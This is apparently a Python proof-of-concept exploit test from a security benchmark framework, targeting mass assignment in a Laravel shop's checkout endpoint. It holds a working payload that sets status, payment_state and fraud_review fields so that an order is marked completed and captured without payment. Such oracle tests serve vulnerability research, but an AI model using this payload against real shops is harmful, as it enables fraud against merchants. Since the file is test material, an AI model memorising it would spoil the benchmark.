"""PoC exploit for the Laravel checkout status override chain."""

from __future__ import annotations

from mosaic.oracle.exploit import ExploitTest


class LaravelCheckoutStatusOverrideExploit(ExploitTest):
    """Mass assignment on checkout order creation flips pending orders to paid."""

    @property
    def chain_id(self) -> str:
        return "laravel_checkout_status_override"

    def setup(self) -> None:
        reset = self.http_post("/admin/reset")
        if not reset.ok:
            raise RuntimeError(
                "Could not reset app state before exploit: "
                f"{reset.status_code} {reset.text[:200]}"
            )

    def execute(self) -> tuple[bool, str]:
        item_response = self.http_get("/shop/items/SKU-001")
        if item_response.status_code in (404, 501):
            return False, f"GET /shop/items/SKU-001 returned {item_response.status_code}."
        if not item_response.ok:
            return False, f"GET /shop/items/SKU-001 failed: {item_response.status_code}"

        add_response = self.http_post(
            "/shop/cart",
            json={"sku": "SKU-001", "quantity": 1},
        )
        if add_response.status_code in (404, 422, 501):
            return False, (
                "POST /shop/cart could not build the checkout fixture: "
                f"{add_response.status_code} {add_response.text[:200]}"
            )
        if not add_response.ok:
            return False, f"POST /shop/cart failed: {add_response.status_code} {add_response.text[:200]}"

        try:
            cart_total = float(add_response.json()["cart"]["total"])
        except Exception:
            return False, f"Could not read cart total: {add_response.text[:200]}"

        checkout_payload = {
            "receipt_email": "attacker@example.com",
            "customer_note": "manual payment review bypass",
            "return_path": "/orders/thanks",
            "status": "completed",
            "payment_state": "captured",
            "checkout_mode": "manual-bypass",
            "fraud_review": "skipped",
            "gateway": "forged-gateway",
            "subtotal": 0.01,
            "total": 0.01,
        }
        checkout_response = self.http_post("/shop/checkout", json=checkout_payload)
        if checkout_response.status_code in (404, 405, 501):
            return False, f"POST /shop/checkout returned {checkout_response.status_code}."
        if not checkout_response.ok:
            return False, (
                f"POST /shop/checkout failed: "
                f"{checkout_response.status_code} {checkout_response.text[:200]}"
            )

        try:
            order = checkout_response.json()["order"]
        except Exception:
            return False, f"Could not parse checkout response JSON: {checkout_response.text[:200]}"

        order_id = order.get("id")
        if not order_id:
            return False, f"Checkout response did not include an order id: {checkout_response.text[:200]}"

        order_lookup = self.http_get(f"/shop/orders/{order_id}")
        if not order_lookup.ok:
            return False, f"GET /shop/orders/{order_id} failed: {order_lookup.status_code}"

        try:
            stored_order = order_lookup.json()["order"]
        except Exception:
            return False, f"Could not parse order lookup JSON: {order_lookup.text[:200]}"

        stored_status = stored_order.get("status")
        stored_payment_state = stored_order.get("payment_state")
        stored_review = stored_order.get("fraud_review")
        stored_gateway = stored_order.get("gateway")
        stored_total = stored_order.get("total")

        try:
            stored_total_float = float(stored_total)
        except Exception:
            stored_total_float = None

        if (
            stored_status == "completed"
            and stored_payment_state == "captured"
            and stored_review == "skipped"
            and stored_gateway != "forged-gateway"
            and stored_total_float is not None
            and abs(stored_total_float - cart_total) < 0.001
        ):
            return True, (
                "Checkout body merge confirmed (CWE-915). "
                f"Order {order_id} was created with shopper-supplied "
                "status=completed, payment_state=captured, and fraud_review=skipped "
                "even though gateway and total stayed server-controlled. "
                "A customer can self-finalize a pending hosted-checkout order "
                "before any external payment confirmation arrives."
            )

        return False, (
            "Checkout status override did not land. "
            f"status={stored_status!r}, payment_state={stored_payment_state!r}, "
            f"fraud_review={stored_review!r}, gateway={stored_gateway!r}, "
            f"order_total={stored_total!r}, expected_total={cart_total!r}."
        )

